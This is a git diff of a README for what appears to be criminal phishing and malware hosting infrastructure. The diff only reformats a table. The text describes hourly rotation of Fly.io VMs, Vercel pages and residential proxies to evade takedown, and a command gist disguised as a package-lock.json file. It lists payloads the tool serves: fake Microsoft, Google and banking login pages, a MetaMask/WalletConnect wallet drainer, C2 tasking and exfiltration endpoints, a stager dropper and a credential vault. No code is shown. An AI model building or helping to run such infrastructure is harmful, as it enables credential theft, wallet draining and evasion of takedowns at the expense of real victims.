@@ -67,6 +67,7 @@ python -m dashboard.run_dashboard
 ## How It Works
 
 Every 60 minutes the rotation engine:
+
 1. Spins up a **new Fly.io VM** (fresh IP, fresh machine ID)
 2. Deploys **new Vercel pages** (fresh TLS cert, fresh URL)
 3. Rotates **residential proxy** credentials (fresh exit IP)
@@ -78,14 +79,14 @@ The only stable artifact is the GitHub gist, disguised as a `package-lock.json` 
 
 ## Payload Types
 
-| Type | Served On | Description |
-|------|-----------|-------------|
-| `phishing` | Vercel | Fake login pages (Microsoft, Google, banking, etc.) |
-| `drainer` | Vercel | Crypto wallet drainer (MetaMask/WalletConnect) |
-| `malware_api` | Fly VM | C2 tasking, exfil ingestion, command dispatch |
-| `stager` | Both | First-stage dropper (JS on Vercel → stage2 on Fly) |
-| `credential_vault` | Fly VM | Exfil ingestion + credential storage |
-| `custom` | Vercel | Arbitrary HTML/JS payloads |
+| Type               | Served On | Description                                         |
+| ------------------ | --------- | --------------------------------------------------- |
+| `phishing`         | Vercel    | Fake login pages (Microsoft, Google, banking, etc.) |
+| `drainer`          | Vercel    | Crypto wallet drainer (MetaMask/WalletConnect)      |
+| `malware_api`      | Fly VM    | C2 tasking, exfil ingestion, command dispatch       |
+| `stager`           | Both      | First-stage dropper (JS on Vercel → stage2 on Fly)  |
+| `credential_vault` | Fly VM    | Exfil ingestion + credential storage                |
+| `custom`           | Vercel    | Arbitrary HTML/JS payloads                          |
 
 ## OPSEC Layers
 
